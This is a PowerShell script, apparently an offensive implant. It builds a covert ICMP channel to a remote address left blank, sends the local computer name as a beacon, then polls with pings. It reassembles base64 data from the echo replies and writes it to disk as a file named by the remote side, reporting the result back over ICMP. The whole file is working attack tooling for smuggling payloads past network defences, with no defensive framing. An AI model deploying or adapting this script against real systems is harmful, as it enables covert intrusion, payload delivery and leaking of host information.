$IPAddress = ""
$Delay = 5
$BufferSize = 128
$b64lines = [System.Text.StringBuilder]::new()
$filename

$ICMPClient = New-Object System.Net.NetworkInformation.Ping
$PingOptions = New-Object System.Net.NetworkInformation.PingOptions
$PingOptions.DontFragment = $True
$sb=""

$sendbytes = ([text.encoding]::ASCII).GetBytes("Connected to "  + $env:computername + "`n`n")
$ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

while ($true)
{
	$sendbytes = ([text.encoding]::ASCII).GetBytes('')
	$reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)

	if ($reply.Buffer)
	{
		$b64chuck = ([text.encoding]::ASCII).GetString($reply.Buffer)
		if ([bool]$b64chuck)
		{
			switch ($b64chuck)
			{
				{$b64chuck -match "##"} 
				{
					$filename=$b64chuck.split('##')[2]
				}
				
				{$b64chuck -match "#EOF#"}
				{
					try { 
						[IO.File]::WriteAllBytes($filename, [Convert]::FromBase64String($sb.Trim()))

						$sendbytes = ([text.encoding]::ASCII).GetBytes("`n`n"+$filename +" saved to "  + (Get-Location).Path + "`n`n")
						$ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
					}
					catch { 

						$sendbytes = ([text.encoding]::ASCII).GetBytes("`n`n"+"An error occurred: "+ $_ +"`n`n")
						$ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
					}

					break;
				}
				Default {
					$sb+=$b64chuck
				}
			}
		}

	}
	else
	{
		Start-Sleep -Seconds $Delay
	}
}
